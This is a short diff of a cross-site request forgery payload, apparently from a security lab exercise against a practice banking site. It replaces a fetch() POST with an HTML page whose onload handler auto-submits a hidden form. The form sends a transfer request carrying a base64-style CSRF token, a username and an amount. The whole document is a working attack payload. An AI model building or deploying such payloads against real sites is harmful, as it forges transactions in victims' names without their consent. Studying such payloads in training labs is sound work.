@@ -1,9 +1,11 @@
-<script>
-fetch("https://phish-me.quoccacorp.com/api/transfer", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/x-www-form-urlencoded"
-  },
-  body: "csrf_token=NTkwNw%3D%3D&username=z5583519&amount=32131"
-});
-</script>
+<html>
+<body onload="document.forms[0].submit()">
+
+<form action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
+    <input type="hidden" name="csrf_token" value="NTg5NA%3D%3D">
+    <input type="hidden" name="username" value="z5583519">
+    <input type="hidden" name="amount" value="32131">
+</form>
+
+</body>
+</html>
